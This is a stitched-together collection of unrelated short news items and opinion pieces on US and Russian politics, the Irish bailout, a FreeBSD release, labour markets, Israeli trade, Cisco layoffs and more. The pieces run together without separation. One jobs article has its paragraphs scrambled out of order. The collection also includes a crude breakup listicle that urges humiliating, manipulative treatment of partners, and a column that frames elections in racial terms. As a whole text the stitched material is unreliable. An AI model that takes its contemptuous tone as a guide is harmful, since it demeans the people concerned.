But for Furry Tales to keep going, to keep giving elderly people the comfort and social interaction they desperately need, the farm needs our help.
They've created a crowdfunder, in the hopes of raising enough money to keep the programme going and deliver outreach packages to introduce more people to Furry Tales.
If you fancy helping them out (and you really should), you can donate through Crowdfunder.
The farm is home to rabbits, pigs, donkeys, ferrets, a bunch of chickens, and goats

There will be a lot of hot takes in Alabama which is not suddenly a Democrat state. But there is one take that is inescapable and undeniable after a contentious election: Trump only works for Trump.
The Roy Moore campaign was confronted with credible allegations that the aspiring senator had molested a 14-year-old and dated teenagers while in his thirties. He all but admitted to the latter and admitted to knowing at least one of the accusers. Then he denied it all and denied knowing any of the accusers. The campaign then doubled down on attacking the press in the mode of Donald Trump.
In fact, after the allegations were made public, the Moore campaign decided to model itself on the Trump campaign. They shut out reporters from events. They berated and bullied the press. They changed their stories in a game of Three-card Monte, shuffling facts before our eyes.
That worked with Donald Trump. He could do that. But Roy Moore is no Donald Trump.
Roy Moore failed to persuade enough voters that the allegations against him were bunk. In fact, there is a real lesson to be learned here. Credible allegations must be treated credibly.
Ultimately, Roy Moore failed to persuade enough voters that the allegations against him were bunk. In fact, there is a real lesson to be learned here. Credible allegations must be treated credibly. The Moore team dithered for days before responding, changed their story several times, and then behaved like Donald Trump. It was unpersuasive.
Make no mistake about it, had Roy Moore never faced these allegations and if Roy Moore had faced these allegations with a serious, credible response, he would have won. But he chose a third option by delaying a response then handling it farcically.
Now a Democrat will represent Alabama in the Senate.
Ramzan Kadyrov, the head of Chechnya, announced today that the time has come for the Russian government to find his replacement. Kadyrov delivered the bombshell in an interview with the television network NTV.
“There are lots of successors on our team. We've got very good specialists,” Kadyrov said.
The announcement comes on the one-year anniversary of Boris Nemtsov's assassination. Many in the opposition accuse Kadyrov of having played a role in Nemtsov's death. The suspects arrested for the crime all have ties to Chechnya and the North Caucasus.
In the interview, Kadyrov told NTV that Nemtsov “never bothered him,” explaining that Nemtsov “was not at [his] level.” The interview has already aired for television audiences in Russia's Far East. Viewers in Moscow won't see the interview for another several hours.
Kadyrov's current term has head of the Chechen government expires in April 2016. He told NTV that he thinks his job is done and his political career has “peaked,” but he's also said publicly that he'll return to office, “if asked to come back.”
Kadyrov has repeatedly challenged investigators' claims that Zaur Dadayev, a decorated former Chechen soldier, is the man who pulled the trigger in Nemtsov's murder. Nemtsov's family has demanded that police question Kadyrov in connection with the killing, but Russia's Federal Investigative Committee has said it sees no reason to do this.
A recent report authored by the opposition politician Ilya Yashin (one of Nemtsov's allies) also accuses Kadyrov of having played a role in Nemtsov's death.
Sanders wants to take on 'billionaire class' The Vermont senator insists he wouldn't run just to push Clinton to the left.
If Bernie Sanders plans to take shots at Hillary Clinton, he's saving his ammo.
The Vermont independent and self-proclaimed socialist said Thursday that he'll continue to explore running in the Democratic primary with a trip to New Hampshire this weekend and a visit to Iowa shortly thereafter. But asked to critique the presumed Democratic nominee, Sanders wouldn't go there, at least explicitly.
Story Continued Below
“All I know is if I run, I'm not running against Hillary Clinton,” Sanders said in an interview on C-SPAN's “Newsmakers” that will air on Sunday. “What Hillary Clinton, or Mitt Romney, or anybody else has to say — that's their business. And once we're in a campaign, I can debate those issues.”
Absent a change of heart by Sen. Elizabeth Warren, Sanders is seen as perhaps the Democratic Party's best vessel to channel populist outrage and push Clinton to the left in the Democratic primary. But he insisted that if he were to run, it wouldn't be for that reason.
Sanders said his biggest causes on the campaign trail would be the “collapse of the middle class,” the rise of what he called the Koch brothers' political “oligarchy” and the GOP's position on climate change, which the senator called an “international embarrassment.”
“These and other issues are looming in front of us. And we're going to need bold leadership, we're going to need people prepared to take on, frankly, the billionaire class,” he said.
Still, Sanders is cautious about launching a quixotic campaign. He stressed that he won't run if he “can't do it well” and worries whether he can raise enough money to compete with the Clinton machine or deep-pocketed Republicans.
“My God … if you run for president, you're going to need a gazillion dollars,” Sanders said. “I will not run for president if I can't do it well and if I can't run to win.”
POLITICO reported Thursday that Clinton may delay the launch of her campaign for several months. That could give Sanders space to begin pushing his message to a receptive political media itching for the Democratic race to crank up.
But Sanders said he won't be affected by Clinton's timing, repeatedly deflecting questions about her during the interview.
“She will make her own decisions,” he said, “and I will make my decisions.”
NEW YORK (MarketWatch) — European financial leaders on Sunday approved an 85-billion-euro, or $112.53 billion, aid package for debt-crisis-stricken Ireland.
The agreement was announced at an European Union finance ministers' meeting in Brussels.
The financial package includes 10 billion euros for immediate recapitalization measures, 25 billion euros on a contingency basis for banking system supports and 50 billion euros covering budget-financing needs, according to a statement from the euro-zone finance ministers.
“This program is absolutely essential for the country,” said Irish Prime Minister Brian Cowen at a press conference in Dublin. “We have carefully considered all available policy options. (It's) the best available deal for Ireland.”
Cowen added that the bailout doesn't involve any change in Ireland's ultra-low corporate tax rate and that repayments will be at a 5.8% interest rate. The funding will be available to Ireland at a cheaper interest rate than what is available on the international markets, Cowen added.
“It is a forceful response to vulnerabilities in the banking system imposing a heavy cost on the budget and, in turn, hurting the prospects for growth that Ireland needs for an enduring solution to the crisis,” Olli Rehn, European Union Commissioner, and Dominique Strauss-Kahn, managing director of the International Monetary Fund, said in a joint statement. “Swift and sustained implementation of this program will create a smaller banking sector that is robust and well capitalized, and able to serve the needs of Ireland's economy.”
The Irish government on Nov. 22 requested help from European Union and the International Monetary Fund after weeks of insisting that it didn't need a bailout.
Its bond yields had continued to rise on Thursday, finding little relief even in the wake of the government's pledge a day earlier to cut its budget by 15 billion euros, or about $20 billion, over the next four years. See full story on pressure on Irish bonds.
In preparation for the meetings of the finance ministers telephone consultations occurred among Herman Van Rompuy, president of the European Council; José Manuel Barroso, president of the European Commission; Jean-Claude Juncker, president of the Eurogroup; European Central Bank President Jean-Claude Trichet; Angela Merkel, Germany's chancellor; and Nicolas Sarkozy, France's president, according to a statement from the European Council.
German proposal
Germany had proposed for months that bondholders be included among those who might bear the burden of a bailout when euro members can't manage their debts in the future, according to the Wall Street Journal.
But Trichet and Juncker, the Luxembourg premier who heads the group of euro-zone countries, said private-sector creditors would face restructuring on a “case-by-case” basis and not automatically as Germany had proposed, the paper said.
Germany, which had been unhappy that its taxpayers would be subjected to take on a larger burden to bail out countries such as Ireland and Greece, had said its proposal would reduce reckless borrowing by euro-area members because they would face higher borrowing costs if they neglected fiscal discipline, the Journal reported.
Germany's plan was criticized by some euro-zone governments. They blame its proposal for creating turmoil in the bond markets and pushing up yields of some euro members against increased investor and policy-makers' concerns that Portugal and possibly Spain may need to seek a bailout in coming months, the paper said.
The new “case-by-case” system wouldn't affect creditors until mid-2013 and new “collective action clauses” that may smooth restructuring would only be inserted into euro-zone bonds issued from June 2013 and onward, the Journal reported.

FreeBSD 9.1-RC3 Available...
The third release candidate of the 9.1-RELEASE release cycle is now available on the FTP servers for amd64, i386, powerpc64, and sparc64. The MD5/SHA256 checksums are at the bottom of this message. The ISO images and, for architectures that support it, the memory stick images are available here: ftp://ftp.freebsd.org/pub/FreeBSD/releases/ISO-IMAGES/9.1/ (or any of the FreeBSD mirror sites). This is expected to be the last Release Candidate. Unless a major show-stopper is discovered within the next few days the final Release Builds will be started. If you notice any problems you can report them through the normal Gnats PR system or here on the -stable mailing list. If you want to do a source-based update to an existing system using SVN the branch to use is releng/9.1. If you would like to use CVS instead use RELENG_9_1. The freebsd-update(8) utility supports binary upgrades of i386 and amd64 systems running earlier FreeBSD releases. Systems running 9.0-RELEASE, 9.1-BETA1, 9.1-RC1, or 9.1-RC2 can upgrade as follows: # freebsd-update upgrade -r 9.1-RC3 During this process, FreeBSD Update may ask the user to help by merging some configuration files or by confirming that the automatically performed merging was done correctly. # freebsd-update install The system must be rebooted with the newly installed kernel before continuing. # shutdown -r now After rebooting, freebsd-update needs to be run again to install the new userland components, and the system needs to be rebooted again: # freebsd-update install # shutdown -r now Users of earlier FreeBSD releases (FreeBSD 7.X, 8.X) can also use freebsd-update to upgrade to FreeBSD 9.1-RC3, but will be prompted to rebuild all third-party applications (e.g., anything installed from the ports tree) after the second invocation of "freebsd-update install", in order to handle differences in the system libraries between FreeBSD 7.X or FreeBSD 8.X and FreeBSD 9.X.

MADISON, Wis. - As the current common council met for the last time Tuesday, members unanimously voted to make discriminating against atheism, and others who do not believe in God, illegal.
"This is important because I believe it is only fair that if we protect religion, in all its varieties, we should also protect non-religion from discrimination. It's only fair," ordinance sponsor District 18 Alderwoman Anita Weier said.
The vote amends the city's equal opportunity ordinance, adding atheism as a protected class in the areas of employment, housing and public accommodations.
"There are many categories that are protected," Weier said. "And it did occur to me that if religion was then perhaps the opposite should be"
UW graduate student, and former Atheists Humanists and Agnostics president Chris Calvey was among the five atheists speaking in favor of the proposals.
They told the council stories of housing, employment, volunteer, community, and parental custody discrimination because of their non-belief in God, saying that fact has no bearing on their character, values or what type of job they do.
"It's actually something we're commonly very concerned about, just because atheism is viewed as such a taboo in this country. And there's such a stigma with it. That people in my student group for example are very hesitant to be honest about their lack of belief in God out of fear that they are going to be discriminated against in employment opportunities. If that came up in a job interview that's held against them," Calvey said.
"Having it on the books, where we're legally a protected class, that'll make things much easier for atheists," Calvey said. "And we'll be able to be confident that at least if we're honest about what we actually believe, then we have the law backing us up so we can't legally be discriminated against."
"It's really making a big statement that we're not going to put up with discrimination in the name of God. That being a believer doesn't mean you can discriminate," Freedom From Religion Foundation co-founder Annie Laurie Gaylor said.
No one spoke out against the proposal.
Atheism is now added to the city's long list of protected classes which, in part, includes: sex, race, religion, color, national origin or ancestry, citizenship status, age, handicap/disability, marital status, source of income, arrest record, conviction record, credit history, military discharge status, physical appearance, sexual orientation, gender identity, political beliefs, familial, student and domestic partner status, receipt of rental assistance and Social Security number disclosure.
The more complex question than how to get the right (read ‘hot') person in life (read ‘bed') is how to get him or her out of it. It's a real nasty problem when an asshole or a bitch transforms into a leech and sucks the awesomeness out of your life. So, the question arises, how to kick blast them out of your kingdom? Guru Ghantal helps us mere souls by giving us the solution. He explains that there are two situations to go about it. One in which you care for the brainsucker (Fuck U!) , and one in which you don't (Cheers!).
1. Talk. Explain. And get out . Simple.
2. If you are too chicken and emotional to do step no.1 (DumbFuck!), just write it all on a cheap quality paper, using paper quality as a metaphor for the quality of your life with him/her. Please see that it will not send out a strong message if the letter is soiled with your dried tears (Wiener!) .
3. If you can't even do that (Coward!), it is with great remorse to inform you that you are incapable of breaking up. Go to hell.
4. Here's where the fun starts. Call him/her over. Screw him/her one last time. Let it be wild and violent, like a punishment. Spank all over. When having post coital talk, take the coldest I-don't-give-a-fuck tone and say it's over. (BAM!)
5. Do a Mr.India. No replies to messages, calls etc. Just drop dead. Involve all your friends, common friends and ask them to give no information about your whereabouts. After a few days, send a message saying, ‘Got the hint asshole? Goodbye.'
6. Start spreading the word around that you are single. Let this reach him/her through right channels. When they call you to ask you what's all this that I am hearing, take an apologetic tone and say, ‘Oh I am so sorry darling, I should have told you first. My bad.'
7. Send them a package with things gifted to you by him/her with a note saying, ‘I want all my stuff back, It was all really expensive unlike you.'
P.S: If any of the above mentioned step backfires, then please don't bother to contact Guru Ghantal. Thanks!
The only question for Republicans is: Which candidate can win states that Mitt Romney lost?
Start with the fact that, before any vote is cast on Election Day, the Democrats have already won between 90 and 98 percent of the black vote and 60 to 75 percent of the Hispanic and Asian vote. Unless Republicans run the table on the white vote, they lose.
If there's still hope, it lies with Trump and only Trump. Donald Trump will do better with black and Hispanic voters than any other Republican. But it's with white voters that he really opens up the electoral map.
A Republican Party that wasn't intent on committing suicide would know that. But Stuart Stevens, the guy who lost a winnable presidential election in 2012, says it's impossible for Republicans to get one more white vote — and the media are trying to convince the GOP that he's right.
Stevens says Romney tapped out every last white voter and still lost, so he says Republicans are looking for “the Lost Tribes of the Amazon” hoping to win more white votes: “In 1980, Ronald Reagan won 56 percent of white voters and won a landslide victory of 44 states. In 2012, Mitt Romney won 59 percent of whites and lost with 24 states.”
Apparently, no one's told Stevens about the 50-state Electoral College. The national white vote is irrelevant. Presidential elections are won by winning states. (Only someone who got his ass kicked running an eminently electable candidate might not know this.)
Excluding third parties and breaking it down to a two-man race, Mitt Romney won 88 percent of the white vote in Mississippi, but only 40 percent of the white vote in Massachusetts. What sense does it make to talk about his national percentage of the white vote with disparities like that?
Romney lost the white vote to Obama in five crucial swing states: Maine (42 percent of the white vote), Minnesota (47 percent), New Hampshire (48 percent), Iowa (48 percent) and Wisconsin (49 percent). He only narrowly beat Obama's white vote in other important swing states — Illinois (51 percent), Colorado (52 percent), Michigan (53 percent), Ohio (54 percent) and Pennsylvania (54 percent).
Increasing the white vote in these states gives Trump any number of paths to victory.
If Trump wins only the same states as Romney, but adds Michigan, Pennsylvania, Ohio and Illinois — where Romney's white vote was below his national average — Trump wins with 280 electoral votes. (Romney wasn't an ideal candidate in the industrial Midwest.)
Trump could lose any one of those states and make up for it by winning Minnesota and Wisconsin — where Romney actually lost the white vote. Or he could lose two of those states but add victories in places outside the Rust Belt, where Romney's white vote was also below average, such as Colorado, Iowa, Maine and New Hampshire. (In 1992, Ross Perot came in second in Maine, beating George Bush.)
I haven't even mentioned Florida, where Trump recently trounced Stuart Stevens' dream candidate, Marco Rubio, a sitting senator — and a Cuban! — in a 20-point rout. Republican primary voters outnumbered Democratic primary voters in that election by more than half a million votes.
If Trump wins Florida, he needs to win only two or three of the 10 states where Romney either lost the white vote outright or won a smaller percentage of it than he did nationally.
Stevens' analysis assumes that there will be no new voters — and, again, there isn't a mammal on the North American landmass who knows less about winning presidential elections than Stuart Stevens.
It's as if we're only allowed to divvy up the pile of voters from 2012. Unless you voted in 2012, you can't vote in 2016! Use it or lose it, buddy.
That's not how it works.
Trump is saying he'll bring in lots of new people, as he has throughout the primaries. In the Florida GOP primary, for example, Trump got nearly half a million more votes than Romney did in 2012 — and about half a million new people voted. Trump may be wrong, but it's insane to say that it's impossible for him to bring out new voters.
What's impossible is for any Republican candidate, other than Trump, to win a single state Romney lost. Ted Cruz's corny speaking style is creepy to anyone who doesn't already agree with everything he says. He's the less likable, more hard-edged version of Romney. Every other Republican is, one way or another, a less attractive version of Romney.
Maybe 50 years of Third World immigration means it's too late, and even Trump can't win. But it's an absolute certainty that any other Republican will lose.

Rep. Tulsi Gabbard (HI-02) today addressed the 7th Annual Hawaiʻi Farmers Union United (HFUU) Convention held at Kahumana Farms in Waiʻanae.
The congresswoman recognized the Hawaiʻi chapter's achieving charter status with the National Farmers Union (NFU) and spoke about opportunities for Hawaiʻi in the upcoming 2018 farm bill, and her work to fight for funding for important grant programs that empower Hawaiʻi's communities to live more sustainably, strengthen local and regional food systems, and empower those growing food to feed Hawaiʻi's people, leveling the field, rather than more giveaways to big, agribusiness corporations.
The three day convention brings together members of the NFU, including NFU President Roger Johnson, NFU leadership from across the country, local farmers, small businessowners, and others to explore the concepts of Aloha ‘Aina and Malama ‘Aina to create regenerative agricultural systems for Hawaiʻi. This year's conference includes panels and presentations on polyculture cover crops, agro ecology systems, soil and human health, hemp in Hawaiʻi, sustainable and organic farming, and much more.
Rep. Tulsi Gabbard said, “As a community, we have great potential for Hawaiʻi to empower our local farmers, strengthen our food security, secure funding for critical research, and empower our local communities through locally grown agriculture. Over the last several years, we've seen a rise in local farm-to-school programs, improved value of our coffee industries, and increased engagement among our local community to buy local and invest in community farming. There is much to be done to build on these successes, and events like today's bring together all the necessary community components to make it happen.”

Jobs for skilled workers are going unfilled
Filling jobs has been difficult for firms in some industries or certain parts of the country — particularly for companies seeking skilled workers — despite high unemployment.
There's no doubt that the nation's sluggish labor market continues to favor employers, many of whom are holding back on hiring amid global uncertainty. In May, the national unemployment rate increased to 8.2% from 8.1% the previous month. Millions of U.S. workers have been jobless for so long that they've exhausted their unemployment benefits.
"It's been a chronic problem for many years," Guge said. "You would think it'd be somewhat easier in this economy."
While these workers don't need college degrees, they need at least two years of specialized training plus strong math, reading and writing skills. The plant is loud and filled with heavy machinery. And because the facility operates 24 hours a day, workers must rotate shifts, making it even harder to recruit, said Brett Guge, executive vice president of finance and administration.
The Fontana steelmaker needs experienced electrical and mechanical technicians to help it make metal pipes and flat-roll sheets used in construction projects. The pay is good. An industrial maintenance mechanic can make $64,000 a year plus health benefits. In good years, company profit-sharing can boost pay by $5,000.
With more than 12.7 million Americans unemployed, companies have no trouble attracting applicants. What's tougher for some firms is finding qualified workers. Just ask California Steel Industries.
Still, companies in some industries or certain parts of the country are having difficulty finding workers. Tighter immigration enforcement has squeezed the nation's agricultural sector as farmers from Washington state to Georgia scramble to find enough field hands. Thinly populated North Dakota is so desperate for bodies to keep its oil boom going that the state's governor has pleaded publicly for out-of-state workers to relocate there.
In California, where the April unemployment rate was 10.9%, some renewable energy firms are searching hard for qualified engineers. So are technology companies in Silicon Valley, where the rush to produce next-generation mobile and tablet technologies has sparked bidding wars for top candidates, who can fetch starting salaries from $85,000 to $100,000.
"Everyone's vying for the same talent," said Shannon Callahan, a technical talent partner at Andreessen Horowitz, a Menlo Park venture capital firm. "They're all trying to build … the next great product."
Even firms that aren't designing the next iPhone are struggling. In a recently released study by recruiting firm ManpowerGroup, nearly half of U.S. employers surveyed said they're having trouble filling key jobs despite continued high unemployment.
Some economists are skeptical about all that griping. Adjusted for inflation, incomes for most Americans have been stagnant for years. The recent downturn has given workers even less leverage to demand better pay. Many companies complaining of a "shortage" of talent simply don't want to pay more to get it, said Andy Sum, director of the Center for Labor Market Studies at Northeastern University.
"There are some spot shortages," he said. "But the norm for the country, though, is a massive [labor] surplus. I've never seen a surplus this large."
Still, Sum agreed with Manpower's findings that some high-skill positions in information technology and engineering are hard to fill. Ditto for skilled trades, which include jobs such as heavy-equipment operators, electricians, welders and sheet-metal workers.
Many of those blue-collar workers are starting to retire and won't be easily replaced, said Stanley Stossel, senior assistant business manager for the International Brotherhood of Electrical Workers, Local 47, in Diamond Bar.
"In some ways, the economic downturn staved off the tsunami," Stossel said. "A lot of people were working a few years longer than they had planned on."
Machinists and machine operators are also hard to find. Manufacturing has been a bright spot in a slow recovery, adding almost half a million jobs nationwide since January 2010.
There are many weird and wonderful species on Earth most don't even know and in a way I use Nea to bring these critters closer to the public.Metasepia sagani is a rarely seen animal from the near coastal waters of the Kurnugian sea, they prefer coral reefs as a habitat and are masters of color changing and camouflage. Most prey animals (small fish and crustaceans) don't see them coming when they slowly walk over the seafloor looking just like a rock with some algae on it's back. When surprised or in danger they quickly change their color into a pattern similar to what you see here, this pattern moves and is bright colored to show the predator that this isn't something you can easily swallow.With 15 to 20 cm in length M. sagani is far bigger then it's a terrestrial ancestor and it is a even better walker.P.S.

Israel stands to benefit from the closeness between Brexit Britain and Trump America. Kevin Lamarque Reuters
Since Donald Trump's election, Palestine campaigners have focused on new settlement construction, Israeli annexation of private Palestinian land and the apparent demise of the two-state solution.
But a broader confluence of interests between Trump's America, Benjamin Netanyahu's Israel and Theresa May's Brexit Britain also deserves scrutiny.
Last year, Netanyahu's major allies offered disaffected voters the dream of fiercely sovereign and self-reliant nations. But in reality, the future states they are peddling could end up looking like Israel: increasingly paranoid, isolated and ethnocentric countries walled off from their neighbors.
Should the US and UK continue their drift toward Israeli-style ethno-religious nationalism, the political and economic interests of the three countries will align still further. Tel Aviv could pick up the slack left by Trump's rollback from global trade agreements and become an increasingly important partner for Britain as May grasps for new trade deals. Trump and May have already made significant overtures in this direction.
In turn, these trade opportunities could grant Israel greater political leverage, enabling it to become more of an independent (though junior) partner of the stumbling US superpower. Netanyahu will hope to ride out any global lurch towards economic isolationism, reaping economic and thus political capital.
Trade
Amid the furor over the US embassy's potential relocation to occupied Jerusalem, just departed US ambassador Dan Shapiro urged Trump to pass a US-Israel free trade deal which sits waiting for his signature.
With the Trans-Pacific Partnership (TPP) dead in the water and the North American Free Trade Agreement (NAFTA) in Trump's crosshairs, Israel is one potential trade partner that may be more palatable to the tycoon's anti-globalization, terror-spooked base. The White House and Tel Aviv have both alluded to a potential convergence and intensification of trade and security interests.
Netanyahu has long depicted Israel as America's key counter-terror bulwark, but he is now dealing with America's most staunchly pro-Israel executive yet. Using far stronger rhetoric than the Obama administration, Vice President Mike Pence recently called Israel America's “most important ally.”
What is new is the emphasis on trade, presented as fundamental to the evolving special relationship. In the joint press conference during Netanyahu's February visit to Washington, the Israeli premier presented trade as bound up with security issues.
“I look forward to working with you to dramatically upgrade our alliance in every field, in security and technology and cyber and trade and so many others,” he said.
Trump made no immediate reply. But the White House's official response echoed Netanyahu's words: “as Israel's largest bilateral trade partner, the United States is eager to expand its economic partnership, which is nearing $50 billion annually.” It depicted the two countries as united “especially in the face of terrorism,” with a “dynamic economic and trade relationship” arising from “shared values.”
Trump's “tough on trade” stance entails both the rejection of multinational trade deals and the threat of increased American resort to tariffs to encourage internal investment. Alongside NAFTA and the TPP, he's vocally singled out China and Mexico. Given this generalized rollback from large trade deals, America's “most important ally” may well step into the vacuum to pursue new bilateral trade agreements, using security issues as a bargaining chip when locking in future pacts.
In one early example of potential new commercial links, the US Department of Homeland Security in late January heard a pitch to expand the US-Mexico border wall from the Israeli security company that walled in Gaza. As per the 2016 military aid deal reached with the Obama administration, expect to see Israeli firms bidding more for US contracts through American subsidiaries.
Leverage
Britain is Israel's second-largest export market. David Quarrey, Britain's ambassador to Israel, has already said Brexit presents a “real opportunity” for increased trade between the two countries.
A UK-Israel taskforce is “preparing the ground” for a new trade deal, following Theresa May's talks with Netanyahu in London. This follows a deal signed in March 2016, the “UK's biggest ever export deal to Israel,” according to Quarrey, when Rolls-Royce landed a £1 billion ($1.25 billion) aviation contract.
Theresa May's palpable desperation for new trading partners thus has potential benefits for Netanyahu, some of which have already been felt. Asked whether the British prime minister would challenge Netanyahu over settlement building during his recent visit to the UK, Downing Street said talks would focus on trade, as the “priority is building a stronger bilateral relationship … and improving trade post-Brexit.”
A Downing Street spokesperson declined to expand to The Electronic Intifada on this comment.
Tellingly, May's spokesperson also criticized outgoing US Secretary of State John Kerry after he condemned recent settlement expansion last year. Other Western powers backed Kerry, but May chose to align herself with Trump and Israel.
May cannot afford to make more enemies and Netanyahu will recognize this. With a weakened Britain increasingly taking its cues from Trump, even a hypothetical liberal successor to May would find it more difficult to oppose Israeli expansionism. The Trump administration may have backtracked on its explicit support for settlements, but Israel has already announced 6,000 new units across the West Bank since Trump took office, and shows no sign of slowing the construction.
The future
Potential successors to Netanyahu, from Yair Lapid to Avigdor Lieberman, have all cozied up to the Trump administration.
In a recent opinion poll, hardline Israeli education minister Naftali Bennett was Israel's second choice after the more centrist Lapid for the premiership post-Netanyahu. Bennett, who has repeatedly outflanked his own prime minister on settlements and has been dubbed Israel's “Mr. Security”, said in 2013 that Israel was far too dependent on US aid: “US military aid is roughly 1 percent of Israel's economy. I think, generally, we need to free ourselves from it.”
The Obama administration locked in the largest military assistance package to any country in US history, worth $38 billion to Israel over a decade, so true economic autonomy remains distant.
Nevertheless, other possibilities are emerging for Israel's economy as it strives to beat back the boycott, divestment and sanctions movement or BDS.
In his article urging a new trade deal, former US ambassador to Israel Dan Shapiro noted how American companies are “helping develop Israel's offshore gas boom.” These as yet untapped natural gas resources may well fuel an economic boom, but for now Israel is only the 34th largest economy worldwide.
However, Bennett's comments remain suggestive. Israel does not need to attain economic parity with the UK for its diplomats to enjoy new bargaining powers. By aligning itself as a more independent junior partner working alongside the Western powers, rather than merely a military client state of the US, it can play the UK off against its big North American brother to win concessions.
In a sense, it is thanks to this continued disparity that a few new trade deals, mid-sized by American standards, could have a major impact in Israel. As globalization falls out of favor, the next few years could see Israel, Britain and the US forming an iron triangle of quasi-pariah states – with Palestinians suffering at its sharpest point.

Many North Korean defectors in South Korea are satisfied enough with their life in the South to bring their family over but feel that fierce competition and discrimination are hard to overcome. Their feelings remain ambivalent even after a considerable time spent living here.
Pundits say this failure to integrate fully into South Korean society must be addressed before reunification.
In a survey by the Chosun Ilbo of 200 North Korean defectors at the end of January, 71.5 percent said they are satisfied with their life in the South, compared to 22.5 percent who said neither satisfied nor dissatisfied, and 4.5 percent who are not satisfied.
Ninety-one percent of the respondents said they are familiar with the ways of South Koreans, with 63 percent describing themselves as South Korean. Only 25 percent still identify themselves as North Koreans and 10 percent as neither.
Asked whether they would like to bring family members from North Korea here, 51 percent said they will do so as soon as possible and 42.5 percent if they get the opportunity.
Most said their image of South Korea improved once they got here, with 82 percent, as against a mere 5.5 percent who said it got worse. Most North Koreans in other words are adapting to the life here reasonably well and comfortably.
Freedom and affluence were cited as the most satisfying elements of life in the South.
Supreme Court Justice Anthony Kennedy will remain on the bench for at least another term, despite indications that his retirement was imminent.
Rumors abounded that Kennedy was preparing to depart the bench at the end of the Court's current term in June 2017. Several signals tended strongly in the rumor's favor.
Kennedy, for example, only hired one clerk for the coming term as of last month. This is highly unusual, as clerks are usually hired far in advance of their service on the Court. Secondly, he declined to teach over the summer at the McGeorge School of Law's summer program in Salzburg, Austria, as is usually his custom. Finally, he scheduled his usual five-year reunion with his law clerks one year early, in 2017 instead of 2018.
It also bears noting that Kennedy is 80 years old, though by all accounts he is in good health. (RELATED: Merrick Garland Is Going Back To His Old Job)
New developments, however, suggest Kennedy plans to man his post on the high court for awhile longer. Above the Law (ATL) reports the justice has hired two additional clerks for the next term. ATL's sprawling network of tipsters and well-placed informants usually leads them to break news on such hires. The identities of the two additional clerks have not yet been reported.
Kennedy is usually the swing vote among the justices, though he resents the characterization. President-elect Donald Trump will make at least one appointment to the Court, however, Kennedy's vote will still be critical to the outcome of ideologically-charged cases that tend to divide the justices. As such, he will likely still enjoy his position of maximum influence for several years.

Samsung publicly announced Tuesday its intention to develop a smartwatch to compete with a similar speculated upcoming Apple product, according to Bloomberg. Samsung emphasized that it wants to be first out of the gate with the product and is pitting itself in a race against Apple to win consumer attention.
"We've been preparing the watch product for so long," Executive VP of Samsung Mobile Lee Young Hee told Bloomberg. "The issue here is who will first commercialize it so consumers can use it meaningfully."
A few screenshots from an Samsung smartwatch named the Galaxy Altius leaked in February. The screenshots showed a 500×500 screen running an OS named "AltiusOS beta2," so it's not explicitly clear whether the watch would run Android or not. The watch appeared to include 235MB of internal storage space and was able to handle music, e-mail, and mapping apps.
By contrast, Apple's iWatch, which may be made of curved glass, will reportedly run a full version of iOS and will launch later this year. Apple has chosen not to scale up the iPod nano's OS, but it has apparently run into some problems getting the watch's battery to last beyond a couple of days. Ideally, it would only need to recharge every four or five days.
Samsung's determination to beat Apple to market echoes the race Samsung and Android initially lost to Apple for a market-dominating touchscreen smartphone. The notion of the smartwatch also seems like a sidelong answer to Google Glass as a way to minimize the interference of a smartphone's alerts and interactions to a smaller, less intrusive accessory.
VegNews News News UK Meat-Free Market Has Grown by 20 Percent Consumers in the United Kingdom are turning to meat-free products as an answer to health concerns and rising prices of meat. Share this
The market for meat-free products in the United Kingdom has grown 20 percent in the past five years. Information recently released by market-research company Mintel reveals that 15 percent of the nation's residents now avoid red meat, motivated mostly by health and lifestyle concerns, while two percent made the change due to allergies, and six percent now classify themselves as “vegetarian.” Furthermore, 38 percent say they buy meat-free meals—13 percent because of cost factors (rising cost of meat and more affordable prices of vegetarian options). A senior analyst at Mintel speculates that the rising cost of meat could continue to boost the market in the future, which is currently estimated to be worth roughly $973 million (US).

Sources are telling TechCrunch that Cisco is planning a significant cost reduction this week, which could involve budget cuts and layoffs.
We've been hearing that the reductions will be announced on August 17th or 18th and that they will be a part of a push to cut costs by 15 percent, with managers given some flexibility around how they implement this.
“A cost reduction of 15% that will include layoffs” is how one source described it. “Managers either cut costs or cut people.”
The rumors of cuts are clearly making the rounds: Trade magazine CRN yesterday reported layoffs of up to 14,000, and by our 15 percent number the figure might be more like 10,000. Cisco currently has around 72,000 employees worldwide.
A Cisco spokesperson told us that the company is in a quiet period prior to announcing their fourth quarter earnings this week, and would not comment regardless on rumor or speculation. Notably the company has used its August earnings to announce layoffs before — some 5 percent downsized last year, for example.
Cisco, like so many traditional IT companies has been in transition for some time. Since the beginning of 2015, it has made 16 acquisitions, an incredibly high level of activity, as it tries to use its cash on hand to help it pivot from its core network hardware business to a software and services business with a concentration on cloud, security and Internet of Things (IoT).
Cisco has no shortage of cash to buy companies to make that move with $63.5 billion cash on hand according to YCharts.
That money is also helping them take disruptive startups off the market and bring them in the fold. As an example, Cisco spent $1.4 billion earlier this year to buy Jasper Technologies, in a nod toward helping companies manage Internet of Things in the cloud.
As its core networking market becomes increasingly commoditized, moves like this allow Cisco to move into the more lucrative software market, while still playing to its networking strengths.
“The battle in IOT is ultimately about the network. Sensors, stacks and platforms will be commoditized in the network. But you need them for the foundation in the network. It's a very smart and calculated move by Cisco,” R Ray Wang, founder and principal analyst at Constellation Research told TechCrunch at the time of the Jasper purchase.
But as companies go through these transitions, it's not necessarily smooth ride. It requires new skill sets. People who designed, built, marketed and sold the networking stuff might not be needed in the next version of Cisco.
As it transitions, as we've seen with IBM, Intel and Microsoft, there are going to be waves of job reductions as they retool for what comes next. That's probably not much of a consolation for the folks who end up losing their jobs, but it's a harsh reality as the shift takes place. The good news is there will be a big market for newer skill sets, and folks who have those skills should be in demand.
Update, 8/18/16: Cisco has confirmed it will cut 5500 jobs or 7 percent of its workforce.
The Conservatives are putting the opposition on notice that a second omnibus budget bill – with changes to federal science policy, business tax credits and pensions for public servants and MPs – will dominate the government's fall legislative agenda.
The Conservatives' decision to cram their first budget bill with a host of items that had little to no connection to the actual budget became a source of political fireworks earlier this year. The opposition accused the government of subverting democracy and proposed more than 800 amendments to the bill in an attempt to delay its passage in June.
Polls show little evidence that the parliamentary battle hurt the government's popularity, and now the opposition waits to see if the Conservatives will do it again.

Thomas Hall suspects they will, but hopes they won't. The retired House of Commons procedure clerk says budget bills used to be limited to tax changes. The Liberal government began to use budget bills more broadly, and Mr. Hall said the Conservatives have gone even further.
"Now they're sticking all kinds of things in there," he said. "They're going too far."
The practical impact is that these bills are studied by the finance committee only, not the committees that focus on the particular policy areas of each measure.
